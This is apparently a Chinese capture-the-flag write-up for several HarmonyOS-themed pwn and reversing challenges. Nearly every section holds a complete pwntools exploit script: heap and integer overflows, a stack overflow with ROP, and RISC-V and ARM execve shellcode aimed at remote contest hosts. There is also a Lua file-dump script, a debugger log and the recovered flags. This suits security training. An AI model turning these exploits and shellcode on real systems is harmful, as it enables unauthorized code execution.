哪有什么战队_从来都是一个人

# 0x01 harmofs01
很明显整数溢出到越界
小的堆喷来获得相邻的heap
leak heap地址后，根据和libc偏移打io即可
```
from pwn import *
context.log_level = 'debug'

#p = process("./start_qemu.sh")

def touch(name, size):
    p.sendlineafter("h > ", "touch")
    p.sendlineafter("File size: ", str(size))
    p.sendlineafter("File name: ", name)

def do1_seek(name, offset):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "3")
    p.sendlineafter("Mode: ", "1")
    p.sendlineafter("Offset: ", str(offset))

def read(name, size, note):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "1")
    p.sendlineafter("Size: ", str(size))
    p.send(note)

def write(name, size):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "2")
    p.sendlineafter("Size: ", str(size))

def delete(name):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "4")

#p.sendlineafter("kirin: ","123")
#p.sendlineafter("\x23\x20\x1b\x5b\x30\x6d","cd /bin")
#p.sendlineafter("\x23\x20\x1b\x5b\x30\x6d","./harmofs")
p=remote("124.71.139.184",30719)
p.recvuntil("Gift: ")
libc=int(p.recvuntil("\n").strip(),16)-0x00086eb8
p.recvuntil("Gift: ")
elf=int(p.recvuntil("\n").strip(),16)-0x012D8 
for i in range(16):
   touch("a"+str(i),0x3f0)
delete("a12")
delete("a14")

#delete("a12")
do1_seek("a15", 2147483648)
do1_seek("a15", 2147483648-0x1c)
read("a15",0x1c,p32(0x14)+p32(0xfffffbc4-0x1c)+"aaaa"+p32(0)*3+p32(0xffffffff)+"\n")
write("aaaa\x00",8)
#do1_seek("a8", 2147483648)
#do1_seek("a8", 2147483648-0x1c)
#read("a8",0x1c,p32(0)+p32(0x419-0x1c)+p32(elf+0x3064-0x1c)+p32(elf+0x3064-0x18)+"\n")
#delete("aaaa\x00")

p.recvuntil("\x0d\x0a\x0d\x60")
p.recv(3)
heap=u32(p.recv(4))+0xc84
print hex(heap)
#pause()
#p.interactive()
magic=libc+0x252311e8-0x2518d000-heap
if magic<0:
   magic+=0x100000000

payload="/etc/flag\x00"+"\x00"*2+p32(libc-0x2518d000+0x25210428)
payload+=p32(libc-0x2518d000+0x25234864)*2+p32(0)+p32(libc-0x2518d000+0x25234864)
payload+=p32(0)+p32(elf+0x1248)
do1_seek("aaaa\x00", 1048-0x1c+28)
read("aaaa\x00",8,p32(0x14)+p32(magic-8)+"\n")

p.recvuntil("Not supported\r\r\n")
pause()
read("aaaa\x00",len(payload),payload+"\n")
print hex(libc),hex(elf),hex(heap)
#delete("/etc/flag\x00")
#flag{HarmonyOS_HAS_AN_CO0L_FS}
p.interactive()
```
# 0x02 honormap01
scanf越界导致前面的判断失效
而后溢出写edit function指针即可
```
from pwn import *


context.log_level="debug"
p=process("./start_qemu.sh")

def cmd(ch):
    p.sendlineafter("CMD > ",ch)

def do(note):
     p.sendlineafter(": ",str(note))
def add(hi,wi,ty):
    cmd("alloc")
    do(hex(hi))
    do(hex(wi))
    do(ty)
def show(index):
    cmd("view")
    do(index)

def edit(index,x,y,s,note):
    cmd("edit")
    do(index)
    do(x)
    do(y)
    do(s)
    do(note)
#p=remote("124.71.139.184",32280)
p.recvuntil("[Init] main, entering wait.\r\r\n")
p.sendline()
add(0,0x800000,0)
add(0x11,0x11,0)
add(0,0x800000,0)
add(0,0x800000,0)
add(0,0x800000,0)
add(0,0x800000,0)
show(4)
p.recvuntil("\x00"*8)
p.recvuntil("\xa0")
elf=u64("\xa0"+p.recv(7))-0x11a0
edit(5,25,0,80,p64(elf+0x1350))
edit(4,25,0,80,"111111111111111111111111"+"/etc/flag\x00")
print hex(elf)
cmd("edit")
do(5)
p.interactive()
```

# 0x03 luaplayground01
应该是非预期？
试了一下lua可以open文件
直接dump二进制程序逆向即可(简单的xor)
dump：
```
from pwn import *

context.log_level="debug"

def cmd(s):
   p.sendlineafter("> ",s)
def l(s):
    f=open("3.txt","a+")
    f.write(s)
    f.close()
p=remote("124.70.221.177",30594)
p.recvuntil("[Init] main, entering wait.\r\r\n")
p.sendline()
p.sendlineafter("> ","f=io.open(\"/bin/flag_app\", \"rb\")")
p.sendlineafter("> ","content=f:read(\"*all\")")

for i in range(0,130): #脚本dump另一个题目时候改过，忘记具体len了
     print str(i)+",--------------"
     cmd("s=string.gsub(string.sub(content,%s,%s),\"(.)\",function (x) return string.format(\"%%02X \",string.byte(x)) end)" %(i*100,i*100+100))  
     
     cmd("print(s)")
     p.recvuntil("print(s)\r\n\r")
     l(p.recvuntil("\r\r\n").strip())
p.interactive()

```
decode:
```
s= [0x9C, 0x6D, 0xE7, 0x56, 0x06, 0xD2, 0x0D, 0xEB, 0xDD, 0xF0, 
  0x9E, 0xB7, 0xFB, 0xE6, 0xEC, 0x3B, 0xB7, 0x5E, 0x75, 0x53, 
  0xD6, 0x83, 0x75, 0xAF, 0x18, 0xF7, 0x99, 0x95, 0xF2, 0xC1, 
  0xF2, 0xDB, 0x9F, 0x65, 0xB4, 0x06, 0x49, 0x87, 0x58, 0xE2, 
  0xDE, 0xB5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, ]
s2=[  0xFA, 0x01, 0x86, 0x31, 0x7D, 0xB1, 0x69, 0xD3, 0xB8, 0xC8, 
  0xA6, 0xD6, 0x98, 0xCB, 0x8E, 0x03, 0xD1, 0x68, 0x58, 0x67, 
  0xB2, 0xE6, 0x40, 0x82, 0x7A, 0xC3, 0xFD, 0xA1, 0xDF, 0xF0, 
  0x96, 0xBF]
ans=""
for i in range(0x2a):
  ans+=chr(s[i]^s2[i&0x1f])
print ans
```

# 0x04 luaplayground02

和luaplayground01一样dump出/etc/flag2.lua
但是发现luadec无法解，格式问题，猜测应该是架构问题
但是在鸿蒙中直接运行，发现attach到进程后，在内核态搜索到了flag字符：
```
06:0018│      0x402b0428 ◂— andeq  r0, r2, #0x20000000 /* 0x2020202 */
07:001c│      0x402b042c ◂— movweq r0, #0x3303 /* 0x3030303 */
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0 40007c0c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGINT
pwndbg> search -p 0x67616c66
<explored>      0x400dadcb strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags!\n' */
<explored>      0x400dda3a strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x400de88d strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag error!\n' */
<explored>      0x400df0bf strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags:0x%x, len=%d\n\r\n' */
<explored>      0x400e8009 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags:%d\n\r\n' */
<explored>      0x400e98b9 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags: 0x%x\n' */
<explored>      0x400ea62d strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags: 0x%x\n' */
<explored>      0x400eeea6 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags      pages   pg/ref\n' */
<explored>      0x400f02ce strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags set' */
<explored>      0x400f723c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x400f736c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x400f746c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x4027716e strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag\n' */
<explored>      0x4036efd7 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag\r\n' */
<explored>      0x40445964 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag' */
<explored>      0x40445981 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag' */
<explored>      0x4044d127 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x404600e9 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flagdata' */
<explored>      0x4046055c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x40460657 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x404a1720 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71' */
<explored>      0x404a1750 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f717' */
<explored>      0x404a17a0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f7170' */
<explored>      0x404a17d0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707' */
<explored>      0x404a1820 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e' */
<explored>      0x404a1870 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-' */
<explored>      0x404a18c0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-3' */
<explored>      0x404a20de strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x40504d68 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags)' */
<explored>      0x4050f830 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9' */
<explored>      0x4050f870 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f' */
<explored>      0x4050f8b0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f2' */
<explored>      0x4050f8f0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22' */
<explored>      0x4050f930 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22b' */
<explored>      0x4050f970 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb' */
<explored>      0x4050f9b0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb2' */
<explored>      0x4050f9f0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28' */
<explored>      0x4050fa30 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28d' */
<explored>      0x4050fa70 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28de}' */
<explored>      0x4050fac0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28de' */
<explored>      0x4050fb10 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28de}' */
```

提交即可：flag{4f71707e-35c7-4159-ab54-ab9f22bb28de}

# 0x05 签到
公众号领flag

# 0x06 harmoshell

栈溢出+shellcode
```
from pwn import *
import sys
context.log_level="debug"

if len(sys.argv)>=2:
   p=process(["./qemu-riscv64","-L","./libs/","./harmoshell"])
else:
      p=process(["./qemu-riscv64","-g","1234","-L","./libs/","./harmoshell"])

def add(name):
   p.sendlineafter("$ ","touch "+name)

def delete(name):
   p.sendlineafter("$ ","rm "+name)

def show(name):
     p.sendlineafter("$ ","cat "+name)

def edit(name,note,ch=1):
   if  ch:
      p.sendlineafter("$ ","echo >> "+name)
      p.sendline(note)
   else:
      p.sendlineafter("$ ","echo > "+name)
      p.sendline(note)
      #p.sendline()
code="\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xee\x93\x06\xe1\xef\x67\x80\xe6\xff"
p=remote("121.37.222.236",9999)
add("aaaa")
add("bbbb")
add("cccc")
delete("bbbb")
delete("aaaa")
add("aaaa")
show("aaaa")
p.recvuntil("Content: ")
heap=u64(p.recvuntil("\n").strip().ljust(8,"\x00"))-0x140
edit("aaaa",code,1)
print hex(heap)
for i in range(44):
    add("a"+str(i))
ans=""
for i in range(48):
   ans+=p64(i*0x10000)
ans=ans.replace(p64(0x270000),p64(heap))
edit("a48",ans,1)
p.interactive()
#0x0000004000a09ddc-0x000000000066ddc
```
# 0x07 harmoshell2

echo操作可以堆溢出，修改下一个chunk的fd即可任意地址分配
而后修改GOT表到shellcode
```
from pwn import *
import sys
context.log_level="debug"

if len(sys.argv)>=2:
   p=process(["./qemu-riscv64","-L","./libs/","./harmoshell2"])
else:
      p=process(["./qemu-riscv64","-g","1234","-L","./libs/","./harmoshell2"])

def add(name):
   p.sendlineafter("$ ","touch "+name)

def delete(name):
   p.sendlineafter("$ ","rm "+name)

def show(name):
     p.sendlineafter("$ ","cat "+name)

def edit(name,note,ch=1):
   if  ch:
      p.sendlineafter("$ ","echo >> "+name)
      p.send(note)
   else:
      p.sendlineafter("$ ","echo > "+name)
      p.send(note)
      #p.sendline()
p=remote("139.159.132.55",9999)
for i in range(10):
    add("a"+str(i))
for i in range(8):
   delete("a"+str(7-i))  

for i in range(7):
   add("a"+str(i))  
code="\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xee\x93\x06\xe1\xef\x67\x80\xe6\xff"

add("aaaa") 
edit("aaaa","aaaaaaaa",0)
show("aaaa")
p.recvuntil("a"*8)
libc=u64(p.recvuntil("\n").strip().ljust(8,"\x00"))+0x4000000000- 0x0000004000aaa9f8+0x0000004000a09aa6-0x000000000066aa6
delete("a5")
delete("a6")
delete("a4")

edit("aaaa",code.ljust(0x80,"a"))
edit("aaaa","a"*0x88)
show("aaaa")
p.recvuntil("a"*0x88)
p.recvuntil("\xa0")
heap=u64(("\xa0"+p.recvuntil("\n")).strip().ljust(8,"\x00"))
print hex(libc),hex(heap)
edit("aaaa",p64(0x130c0))
add("bbbb")
add("cccc")

add("dddd")
delete("a3")
edit("dddd",code)
#edit("dddd","/bin/sh\x00"+p64(libc+0x00388fe),0)
add("aaa")
p.interactive()
```

# 0x08 pwn1
栈溢出且存在printf输出函数
可以leak + system
或者利用qemu NX失效直接shellcode
合理利用main函数中通过R3/R11寄存器设置printf/read函数的参数即可
```
from pwn import *
import sys
context.log_level="debug"

if len(sys.argv)>=2:
   p=process(["qemu-arm","-L","./","./bin"])
else:
      p=process(["qemu-arm","-g","1234","-L","./","./bin"])
#0x00010500 : pop {fp, pc}
#0x00010348 : pop {r3, pc}
#0x00010498 : pop {r4, pc}
p=remote("139.159.210.220",9999)
ans=""
magic=0x104D8 
popr3=0x00010348
for i in range(0x3d):
   ans+=p32(i*0x100)
payload="aaaa"*0x40+p32(0x2100c+0x104-8)+p32(popr3)+p32(0x2100c)+p32(magic)
payload+=p32(popr3)+p32(0x2100c-8)+p32(0)+p32(magic)
p.sendafter("input: ",payload)
libc=u32(p.recv(4))-0x46454
print hex(libc)
print len(ans)
ans="hp\x00\xe3AqD\xe3\x04p-\xe5/\x7f\x02\xe3/sG\xe3\x04p-\xe5/r\x06\xe3i~F\xe3\x04p-\xe5\r\x00\xa0\xe1sx\x06\xe3\x04p-\xe5\x0c\xc0,\xe0\x04\xc0-\xe5\x04\x10\xa0\xe3\r\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0-\xe5\r\x10\xa0\xe1\x02 \"\xe0\x0bp\xa0\xe3\x00\x00\x00\xef".ljust(244,"\x00")
p.send("/bin/sh\x00"+p32(0x2100c+4)+ans+p32(0)+p32(popr3)+p32(0x2100c-8)+p32(magic))
p.interactive()
```